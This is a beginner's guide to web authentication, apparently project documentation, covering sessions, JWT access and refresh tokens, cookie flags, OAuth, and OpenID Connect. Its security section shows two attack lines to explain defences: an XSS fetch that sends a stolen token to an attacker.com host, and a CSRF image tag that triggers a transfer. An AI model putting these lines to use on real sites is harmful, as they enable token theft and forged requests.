# Authentication & Authorization — Complete Beginner's Guide

This document explains every major authentication concept from scratch.
No prior knowledge assumed. Everything is explained with diagrams and real examples.

---

## Table of Contents

1. [Authentication vs Authorization](#1-authentication-vs-authorization)
2. [The Problem — HTTP is Stateless](#2-the-problem--http-is-stateless)
3. [Solution 1 — Session-Based Auth (Stateful)](#3-solution-1--session-based-auth-stateful)
4. [Solution 2 — JWT-Based Auth (Stateless)](#4-solution-2--jwt-based-auth-stateless)
5. [Cookies — How Browsers Store Auth Data](#5-cookies--how-browsers-store-auth-data)
6. [Stateful vs Stateless — Side by Side](#6-stateful-vs-stateless--side-by-side)
7. [What We Use in This Project](#7-what-we-use-in-this-project)
8. [OAuth 2.0 — Let Another Service Handle Login](#8-oauth-20--let-another-service-handle-login)
9. [OAuth 1.0 — The Old Way](#9-oauth-10--the-old-way)
10. [Google Identity Service (OpenID Connect)](#10-google-identity-service-openid-connect)
11. [Frontend ↔ Backend Auth Interaction](#11-frontend--backend-auth-interaction)
12. [Security Concepts You Must Know](#12-security-concepts-you-must-know)

---

## 1. Authentication vs Authorization

These two words are constantly confused. They are completely different things.

### Authentication = "Who are you?"

Authentication is the process of **proving your identity**.

> "I am Vinay. Here is my password."

The server verifies: yes, this password matches what we stored for Vinay.

### Authorization = "What are you allowed to do?"

Authorization is the process of **checking your permissions** after identity is confirmed.

> Vinay is logged in. Can Vinay delete another user's account? No — only admins can do that.

### Real-world analogy

```
Authentication:  You show your ID card at the airport security gate.
                 They verify it is really you.

Authorization:   After passing security, you can only enter Gate 12.
                 You cannot enter the pilots' area — different permission level.
```

### In code terms

```
HTTP Request arrives
        │
        ▼
Authentication Middleware          ← "Is this a real logged-in user?"
  verifies JWT token
  attaches req.user = { id, role }
        │
        ▼
Authorization Middleware           ← "Is this user allowed to do THIS?"
  checks req.user.role === 'admin'
        │
        ▼
Route Handler                      ← actual business logic runs
```

---

## 2. The Problem — HTTP is Stateless

Before understanding auth solutions, you need to understand the core problem.

### What "stateless" means

Every HTTP request is **completely independent**. The server has no memory of previous requests.

```
Request 1:  POST /login  { email, password }
            Server processes it... done. Server immediately forgets.

Request 2:  GET /my-profile
            Server has NO IDEA who is making this request.
            It forgot everything from Request 1.
```

This is like walking into a bank, identifying yourself, then walking out and back in — the teller has no memory of you at all. You have to identify yourself every single time.

### Why HTTP was designed this way

HTTP was built for serving static documents (web pages). State was never needed. Each page request was independent. As the web grew into applications (login, shopping carts, profiles), developers had to invent ways to "remember" users across requests.

---

## 3. Solution 1 — Session-Based Auth (Stateful)

This was the original solution. The server **stores** who is logged in.

### How it works

```
Step 1: User logs in
        Client → Server: POST /login { email, password }
        Server verifies password
        Server creates a "session" in memory or DB:
          sessions["abc123xyz"] = { userId: 42, expiresAt: ... }
        Server sends back a cookie: Set-Cookie: sessionId=abc123xyz

Step 2: User makes any request
        Browser automatically sends: Cookie: sessionId=abc123xyz
        Server looks up sessions["abc123xyz"]
        Finds userId = 42
        Knows who the user is

Step 3: User logs out
        Server deletes sessions["abc123xyz"]
        Cookie becomes useless
```

### Diagram

```mermaid
sequenceDiagram
    participant Browser
    participant Server
    participant SessionStore as Session Store (Redis/DB)

    Browser->>Server: POST /login {email, password}
    Server->>Server: verify password ✓
    Server->>SessionStore: store session {userId:42} → key: "abc123"
    Server-->>Browser: 200 OK + Set-Cookie: sessionId=abc123

    Browser->>Server: GET /profile (Cookie: sessionId=abc123)
    Server->>SessionStore: get("abc123") → {userId: 42}
    Server-->>Browser: 200 OK + user profile data

    Browser->>Server: POST /logout (Cookie: sessionId=abc123)
    Server->>SessionStore: delete("abc123")
    Server-->>Browser: 200 OK + Clear-Cookie
```

### Why it is called "stateful"

The **server holds the state** (the session store). Without the session store, no request can be authenticated. The server is responsible for remembering who is logged in.

### Problems with session-based auth

**Scaling problem:**

If you have 3 servers behind a load balancer, Request 1 might go to Server A (which stores the session), and Request 2 might go to Server B (which has no session store). The user is suddenly "not logged in".

```
         Load Balancer
        /      |       \
   Server A  Server B  Server C
   (session  (no        (no
    here)     session)   session)
```

Solutions exist (sticky sessions, shared Redis), but they add complexity.

**Memory problem:** Millions of active users = millions of sessions stored in memory or DB.

---

## 4. Solution 2 — JWT-Based Auth (Stateless)

JWT = **JSON Web Token**. The idea: instead of storing the session on the server, give the proof of identity to the **client** to hold.

### What a JWT looks like

A JWT is a string with three parts separated by dots:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjQyIiwiaWF0IjoxNjI1MDAwMDAwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
|___________________________|          |___________________________|          |__________________________________|
        Header (base64)                         Payload (base64)                       Signature (HMAC)
```

### The three parts

**Header** — metadata about the token:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload** — the data you want to carry (called "claims"):

```json
{
  "id": "42",
  "iat": 1625000000,
  "exp": 1625000900
}
```

> `iat` = issued at (Unix timestamp)
> `exp` = expires at (Unix timestamp)
> These are standard JWT claim names.

**Signature** — proof that the payload was not tampered with:

```
HMAC-SHA256(
  base64(header) + "." + base64(payload),
  SECRET_KEY
)
```

The signature is computed using a **secret key** that only the server knows. If someone modifies the payload, the signature will no longer match — the token is rejected.

### How JWT auth works

```
Step 1: User logs in
        Client → Server: POST /login { email, password }
        Server verifies password
        Server creates JWT with payload { id: 42 }
        Server signs it with its secret key
        Server sends JWT to client (in cookie or response body)

Step 2: User makes any request
        Client sends: Cookie: accessToken=<jwt>
        Server verifies the signature using its secret key
        If valid: reads payload → userId = 42
        Server knows who the user is — WITHOUT any DB/session lookup

Step 3: User logs out
        Client deletes the token
        Server does nothing (stateless) — the token still exists until it expires
```

### Diagram

```mermaid
sequenceDiagram
    participant Browser
    participant Server

    Browser->>Server: POST /login {email, password}
    Server->>Server: verify password ✓
    Server->>Server: sign JWT { id:42 } with SECRET_KEY
    Server-->>Browser: 200 OK + Set-Cookie: accessToken=<jwt>

    Browser->>Server: GET /profile (Cookie: accessToken=<jwt>)
    Server->>Server: verify signature with SECRET_KEY ✓
    Server->>Server: decode payload → userId = 42
    Server-->>Browser: 200 OK + user profile (NO DB lookup needed)

    Browser->>Server: POST /logout
    Browser->>Browser: delete cookie
    Note over Server: Server does nothing — stateless
```

### Why it is called "stateless"

The server stores **nothing**. Every request carries its own proof of identity inside the token. Any server in a cluster can verify the token independently — just needs the same secret key.

### The problem with stateless JWT

If a JWT is stolen, you cannot "invalidate" it. The server has no list to check against. The token is valid until it expires.

**Solution: Short-lived access tokens + long-lived refresh tokens.**

```
Access Token:  expires in 15 minutes
               If stolen, the attacker has 15 minutes max

Refresh Token: expires in 7 days
               Used only to get new access tokens
               Stored in Redis (making it semi-stateful)
               Can be invalidated by deleting the Redis key
```

### Access token + refresh token flow

```mermaid
sequenceDiagram
    participant Browser
    participant Server
    participant Redis

    Note over Browser,Redis: Login
    Browser->>Server: POST /login
    Server-->>Browser: accessToken (15m) + refreshToken (7d) in cookies

    Note over Browser,Server: Normal API calls
    Browser->>Server: GET /profile (accessToken cookie)
    Server->>Server: verify accessToken signature ✓
    Server-->>Browser: 200 OK

    Note over Browser,Redis: Access token expires after 15 min
    Browser->>Server: GET /profile (expired accessToken)
    Server-->>Browser: 401 Unauthorized

    Note over Browser,Redis: Browser silently refreshes
    Browser->>Server: GET /refresh (refreshToken cookie)
    Server->>Redis: check refresh:<userId>:<deviceId> = stored JTI
    Server->>Server: compare JTI from token vs Redis ✓
    Server->>Server: generate new accessToken + new refreshToken
    Server->>Redis: update Redis with new JTI
    Server-->>Browser: new accessToken + new refreshToken in cookies

    Note over Browser,Server: Retry original request
    Browser->>Server: GET /profile (new accessToken)
    Server-->>Browser: 200 OK
```

---

## 5. Cookies — How Browsers Store Auth Data

### What is a cookie?

A cookie is a small piece of data the **server** sends to the browser, and the **browser** automatically includes in every subsequent request to the same domain.

### How the server sets a cookie

```http
HTTP/1.1 200 OK
Set-Cookie: accessToken=<value>; HttpOnly; Secure; SameSite=Strict; Max-Age=900
```

### How the browser sends it back

```http
GET /profile HTTP/1.1
Cookie: accessToken=<value>
```

The browser does this automatically — you do not need JavaScript to read or send cookies (in fact, `HttpOnly` prevents JavaScript from touching them at all).

### Cookie security flags explained

| Flag              | What it does                                                            | Why you need it                                                                                                        |
| ----------------- | ----------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------- |
| `HttpOnly`        | JavaScript **cannot** read this cookie (`document.cookie` won't see it) | Prevents XSS attacks from stealing tokens                                                                              |
| `Secure`          | Cookie is only sent over **HTTPS**                                      | Prevents tokens from being sent over plain HTTP (where anyone on the network can see them)                             |
| `SameSite=Strict` | Cookie is only sent if the request originates from the **same domain**  | Prevents CSRF attacks (a malicious website cannot trigger your browser to make an authenticated request to the server) |
| `SameSite=Lax`    | Sent on same-site requests and top-level navigation                     | Looser than Strict — allows normal links to work. Used in development.                                                 |
| `Max-Age=900`     | Cookie expires after 900 seconds (15 min)                               | Client-side expiry hint (server always checks JWT expiry independently)                                                |

### Cookie vs localStorage

Many tutorials store JWTs in `localStorage`. This is a **security mistake**.

|                          | Cookie (HttpOnly)              | localStorage                         |
| ------------------------ | ------------------------------ | ------------------------------------ |
| XSS attack can steal it? | ❌ No (HttpOnly)               | ✅ Yes — any injected JS can read it |
| CSRF attack risk?        | ⚠️ Yes (mitigated by SameSite) | ❌ No (not sent automatically)       |
| Server can set/clear it? | ✅ Yes                         | ❌ No — only JS                      |
| Survives page refresh?   | ✅ Yes                         | ✅ Yes                               |
| Recommended for tokens?  | ✅ Yes                         | ❌ No                                |

---

## 6. Stateful vs Stateless — Side by Side

```
                    STATEFUL (Session)          STATELESS (JWT)
                   ┌───────────────────┐       ┌───────────────────┐
Where is the       │ Session Store     │       │ Inside the token  │
identity stored?   │ (Redis / DB)      │       │ (client holds it) │
                   └───────────────────┘       └───────────────────┘

Can you            │ Yes — delete the  │       │ Not until it      │
invalidate         │ session key       │       │ expires           │
immediately?       │                   │       │ (unless you use   │
                   │                   │       │ a Redis blacklist)│

Scales easily?     │ Harder — session  │       │ Yes — any server  │
                   │ store must be     │       │ can verify with   │
                   │ shared            │       │ just the secret   │

DB lookup per      │ Yes               │       │ No                │
request?           │                   │       │                   │

Good for           │ Traditional web   │       │ APIs, mobile apps,│
                   │ apps              │       │ microservices     │
```

### What this project uses

This project uses a **hybrid** approach:

- JWTs for the token format (stateless payload, no DB lookup to verify signature)
- Redis to store the refresh token JTI (adds revocability, making refresh semi-stateful)

This gives you the best of both worlds:

- Access tokens are fully stateless (fast, no DB lookup)
- Refresh tokens can be invalidated instantly (delete the Redis key)

---

## 7. What We Use in This Project

Here is a concrete map of how auth works in `user-service`:

### Token design

```
Access Token JWT payload:
{
  "id": "user-uuid",
  "iat": <issued at>,
  "exp": <expires at +15min>
}

Refresh Token JWT payload:
{
  "id": "user-uuid",
  "jti": "random-uuid",       ← unique ID for THIS specific token
  "iat": <issued at>,
  "exp": <expires at +7d>
}
```

### Redis keys

```
refresh:<userId>:<deviceId>   = <jti>    TTL: 7 days
user:<userId>                 = <json>   TTL: 24 hours (profile cache)
```

### Cookie setup

```
accessToken cookie:
  httpOnly: true
  secure: true (prod) / false (dev)
  sameSite: strict (prod) / lax (dev)
  maxAge: 900 seconds

refreshToken cookie:
  httpOnly: true
  secure: true
  sameSite: strict
  maxAge: 604800 seconds
```

### What `deviceId` is

```
deviceId = SHA256(User-Agent + "|" + IP + "|" + Accept header).slice(0, 16)
```

Used as part of the Redis key so each device gets its own independent session.

---

## 8. OAuth 2.0 — Let Another Service Handle Login

### The problem OAuth solves

Imagine you are building an app that needs to read a user's Google Calendar. You do NOT want the user to give you their Google password. You should never know it.

OAuth 2.0 is a protocol that lets a user **grant your app limited access** to their account on another service — without sharing their password.

### The four actors

| Actor                    | Description                                                   |
| ------------------------ | ------------------------------------------------------------- |
| **Resource Owner**       | The user (the person who owns the data)                       |
| **Client**               | Your application (the app that wants access)                  |
| **Authorization Server** | The server that handles login (Google, GitHub, etc.)          |
| **Resource Server**      | The API that holds the data (Google Calendar API, GitHub API) |

### OAuth 2.0 flow (Authorization Code Grant — most common)

```mermaid
sequenceDiagram
    participant User
    participant YourApp as Your App (Client)
    participant Google as Google Auth Server
    participant GCalAPI as Google Calendar API

    User->>YourApp: "Login with Google" button click

    YourApp->>Google: Redirect to Google login page
    Note over YourApp,Google: https://accounts.google.com/o/oauth2/auth?
    Note over YourApp,Google: client_id=YOUR_APP_ID
    Note over YourApp,Google: redirect_uri=https://yourapp.com/callback
    Note over YourApp,Google: scope=calendar.readonly
    Note over YourApp,Google: response_type=code

    User->>Google: Enter Google email + password
    Google->>User: "YourApp wants to read your Calendar. Allow?"
    User->>Google: Click Allow

    Google->>YourApp: Redirect to callback URL with auth CODE
    Note over Google,YourApp: https://yourapp.com/callback?code=4/abc123

    YourApp->>Google: POST /token {code, client_id, client_secret, redirect_uri}
    Note over YourApp,Google: This is server-to-server. User never sees this.
    Google-->>YourApp: { access_token, refresh_token, expires_in }

    YourApp->>GCalAPI: GET /calendar/events (Authorization: Bearer access_token)
    GCalAPI-->>YourApp: user's calendar events
```

### Key concepts in OAuth 2.0

**Authorization Code:** A short-lived, one-time code exchanged for tokens. It travels through the browser (less secure channel) but is useless without the `client_secret`.

**Access Token:** Short-lived token to call the API. Never shown to the user.

**Refresh Token:** Long-lived token to get new access tokens when they expire.

**Scope:** What permissions the user is granting. Examples:

- `email` — read your email address
- `calendar.readonly` — read your calendar
- `repo` — read your GitHub repos

**client_id + client_secret:** Your app's credentials, registered with Google/GitHub. The `client_secret` must never be exposed to the browser.

### OAuth 2.0 grant types

There are 4 grant types (flows). Each is designed for a different scenario:

| Grant Type                    | When to use                              | Who requests token              |
| ----------------------------- | ---------------------------------------- | ------------------------------- |
| **Authorization Code**        | Web apps with a backend server           | Browser → backend → auth server |
| **Authorization Code + PKCE** | Mobile apps and SPAs (no backend secret) | Browser/app directly            |
| **Client Credentials**        | Server-to-server (no user involved)      | Backend service directly        |
| **Device Code**               | Smart TVs, CLIs (no browser)             | Device polls auth server        |

---

## 9. OAuth 1.0 — The Old Way

OAuth 1.0 was released in 2007. It is now largely obsolete but still used by some older APIs (like Twitter's v1 API).

### Key difference from OAuth 2.0

In OAuth 1.0, **every single request** must be cryptographically signed. There is no "bearer token" — just knowing the token is not enough. You must also prove you have the secret to sign requests.

### OAuth 1.0 signature generation

For every API call, you must:

1. Collect all request parameters
2. Sort them alphabetically
3. Create a "base string": `METHOD&URL&PARAMETERS`
4. Create a signing key: `consumer_secret&oauth_token_secret`
5. Sign with HMAC-SHA1

```
oauth_signature = HMAC-SHA1(
  "GET&https%3A%2F%2Fapi.example.com%2F1%2Fusers&oauth_consumer_key%3D..."
  "consumer_secret&oauth_token_secret"
)
```

### Why OAuth 2.0 replaced OAuth 1.0

| Aspect             | OAuth 1.0                                 | OAuth 2.0                        |
| ------------------ | ----------------------------------------- | -------------------------------- |
| Complexity         | Very complex (signature on every request) | Simple (bearer token)            |
| HTTPS required?    | No (signature provides security)          | Yes (HTTPS is mandatory)         |
| Mobile/SPA support | Poor                                      | Good (PKCE extension)            |
| Token storage      | One token type                            | Separate access + refresh tokens |
| Industry adoption  | Declining                                 | Universal standard               |

**Bottom line:** Unless an API specifically requires OAuth 1.0, always use OAuth 2.0.

---

## 10. Google Identity Service (OpenID Connect)

### What is OpenID Connect?

OpenID Connect (OIDC) is a layer built **on top of OAuth 2.0** that adds **identity** — it tells your app _who the user is_, not just what they're allowed to access.

OAuth 2.0 alone answers: "Can this app access this resource?"
OpenID Connect answers: "Who is this user, and here is their profile."

### The ID Token

OIDC adds a new token type: the **ID Token**. It is a JWT that contains the user's identity information:

```json
{
  "iss": "https://accounts.google.com",
  "sub": "110169484474386276334",
  "email": "vinay@example.com",
  "email_verified": true,
  "name": "Vinay Kumar",
  "picture": "https://lh3.googleusercontent.com/...",
  "given_name": "Vinay",
  "family_name": "Kumar",
  "iat": 1625000000,
  "exp": 1625003600
}
```

`sub` = subject = Google's unique, permanent ID for this user. Use this as the foreign key in your DB, not the email (emails can change, `sub` never does).

### "Sign in with Google" flow (OIDC)

```mermaid
sequenceDiagram
    participant User
    participant YourApp
    participant Google as Google (OIDC Provider)

    User->>YourApp: Click "Sign in with Google"

    YourApp->>Google: Redirect to Google
    Note over YourApp,Google: scope=openid email profile
    Note over YourApp,Google: response_type=code

    User->>Google: Google login + consent
    Google->>YourApp: auth code

    YourApp->>Google: Exchange code for tokens
    Google-->>YourApp: { id_token, access_token, refresh_token }

    YourApp->>YourApp: Verify id_token signature
    YourApp->>YourApp: Decode id_token → { sub, email, name, picture }

    Note over YourApp: Does a user with this sub exist in our DB?
    YourApp->>YourApp: prisma.user.findUnique({ where: { googleId: sub } })

    alt New user
        YourApp->>YourApp: prisma.user.create({ googleId: sub, email, name })
    else Existing user
        YourApp->>YourApp: user found
    end

    YourApp->>YourApp: generate our own JWT for the session
    YourApp-->>User: logged in + Set-Cookie: accessToken=<our-jwt>
```

### Important: Two separate tokens

The Google ID Token and your app's JWT are completely separate:

| Token           | Issued by    | Purpose                                                |
| --------------- | ------------ | ------------------------------------------------------ |
| Google ID Token | Google       | Prove who the user is during signup/login              |
| Your App's JWT  | Your backend | Authenticate every subsequent API call to your backend |

You use Google's token **once** to identify/create the user in your DB, then issue your own JWT for the actual app session.

### Google Identity Services (GIS) JavaScript library

Google provides a JavaScript library that handles the browser side:

```html
<script src="https://accounts.google.com/gsi/client"></script>
```

```js
google.accounts.id.initialize({
  client_id: 'YOUR_CLIENT_ID.apps.googleusercontent.com',
  callback: handleCredentialResponse
});

google.accounts.id.renderButton(document.getElementById('btn'), {
  theme: 'outline',
  size: 'large'
});

function handleCredentialResponse(response) {
  // response.credential is a JWT ID token from Google
  // Send it to your backend for verification
  fetch('/api/v1/auth/google', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({credential: response.credential})
  });
}
```

Your backend verifies the Google JWT:

```js
const {OAuth2Client} = require('google-auth-library');
const client = new OAuth2Client(process.env.GOOGLE_CLIENT_ID);

const ticket = await client.verifyIdToken({
  idToken: credential,
  audience: process.env.GOOGLE_CLIENT_ID
});

const payload = ticket.getPayload();
// payload.sub   = Google user ID
// payload.email = user email
// payload.name  = full name
```

---

## 11. Frontend ↔ Backend Auth Interaction

This section shows exactly how the browser and backend communicate during auth.

### What the frontend does

```
1. Render login form
2. Collect email + password
3. POST to backend /login
4. Backend sets cookies — browser stores them automatically
5. All subsequent requests automatically include the cookies
6. When the server returns 401, call /refresh silently
7. Retry the failed request with new tokens
8. If /refresh also fails → redirect to /login
```

### What the backend does

```
1. Receive credentials
2. Verify against DB
3. Issue tokens
4. Set httpOnly cookies (Set-Cookie header)
5. On protected routes: verify accessToken from cookie
6. On /refresh: verify refreshToken, rotate, issue new tokens
7. On logout: clear cookies, delete Redis key
```

### The 401 + silent refresh pattern

This is the standard frontend pattern for handling expired access tokens:

```
Frontend (e.g. React + axios interceptor):

request → backend (accessToken expired)
backend → 401 Unauthorized

interceptor catches 401:
  → POST /refresh (refreshToken cookie sent automatically)
  → backend rotates tokens, sets new cookies
  → retry original request with new accessToken cookie
  → original response returns to caller

If /refresh also returns 401/403:
  → clear local state
  → redirect to /login
```

```mermaid
flowchart TD
    A[API call GET /profile] --> B{access token valid?}
    B -->|Yes| C[200 OK - return data]
    B -->|No - expired| D[401 Unauthorized]
    D --> E[Interceptor: call GET /refresh]
    E --> F{refresh token valid?}
    F -->|Yes| G[New tokens issued via cookies]
    G --> H[Retry original request]
    H --> C
    F -->|No - expired/invalid| I[Redirect to /login]
```

### CORS and cookies

When frontend and backend are on different domains (e.g. `localhost:3000` and `localhost:4001`), cookies only work if:

**Backend sets:**

```js
cors({
  origin: 'http://localhost:3000', // exact origin, not '*'
  credentials: true // required for cookies
});
```

**Frontend sets on every request:**

```js
fetch('/api/v1/auth/login', {
  credentials: 'include' // tells browser to include cookies in cross-origin requests
});

// or with axios:
axios.defaults.withCredentials = true;
```

If `credentials: true` is missing on either side, cookies will not be sent.

---

## 12. Security Concepts You Must Know

### XSS — Cross-Site Scripting

An attacker injects malicious JavaScript into your page. If your tokens are in `localStorage`, the script steals them.

```js
// Attacker injects this script:
fetch('https://attacker.com/steal?token=' + localStorage.getItem('accessToken'));
```

**Defence:** Store tokens in `httpOnly` cookies. JavaScript cannot access them at all.

### CSRF — Cross-Site Request Forgery

A malicious website tricks your browser into making a request to your backend with your cookies (since cookies are sent automatically).

```html
<!-- Attacker's website -->
<img src="https://yourbank.com/transfer?to=attacker&amount=10000" />
<!-- Browser sends your bank cookies automatically! -->
```

**Defence:** `SameSite=Strict` cookie flag. The browser will only send cookies on requests that originate from your own site.

### Token theft mitigation

- Short-lived access tokens (15 min): stolen tokens are useless quickly
- Refresh token rotation: reuse detection kills the session if a stolen refresh token is used
- Device fingerprinting: stolen tokens from device A cannot be used from device B

### Never store secrets in frontend code

```js
// WRONG — this is exposed to anyone who views source
const SECRET = 'my_jwt_secret_key';

// RIGHT — secrets live only on the backend server
// Frontend never knows the secret
```

### Password hashing

Passwords must never be stored as plain text. Use `bcrypt`:

```
User inputs:   "Password@123"
bcrypt hash:   "$2b$12$9XiGm8Y2z..."   ← this is what goes in the DB

On login:
bcrypt.compare("Password@123", "$2b$12$9XiGm8Y2z...") → true/false
```

The hash cannot be reversed. Even if the DB is leaked, passwords are protected.

---

## Summary — Which approach to use when

```
Building a traditional web app with server-rendered pages?
  → Session-based auth (store session in Redis, session cookie)

Building a REST API for a mobile app or SPA?
  → JWT (access + refresh tokens in httpOnly cookies)

Want users to log in with Google/GitHub/Facebook?
  → OAuth 2.0 + OpenID Connect (use their auth server, get ID token, create your own session)

Building microservices where services talk to each other?
  → JWT (service A issues a token, service B verifies it independently — no shared session store)

Need to grant your app access to another user's data on a third-party service?
  → OAuth 2.0 (authorization code flow)
```

---

## What is implemented in this project vs. what is not

| Concept                               | Status in `user-service`                               |
| ------------------------------------- | ------------------------------------------------------ |
| Password hashing (bcrypt)             | ✅ Implemented                                         |
| JWT access tokens (15m)               | ✅ Implemented                                         |
| JWT refresh tokens (7d) with rotation | ✅ Implemented                                         |
| Refresh token reuse detection         | ✅ Implemented                                         |
| Device-bound sessions                 | ✅ Implemented                                         |
| httpOnly + Secure cookies             | ✅ Implemented                                         |
| OTP-based email verification          | ✅ Implemented (dev mode — OTP in response, not email) |
| Auth middleware (protect routes)      | ⚠️ Placeholder only                                    |
| Logout (Redis key deletion)           | ❌ Not built yet                                       |
| OAuth 2.0 / Google Sign-In            | ❌ Not built yet                                       |
| Password reset flow                   | ❌ Not built yet                                       |
| Role-based authorization              | ❌ Not built yet                                       |
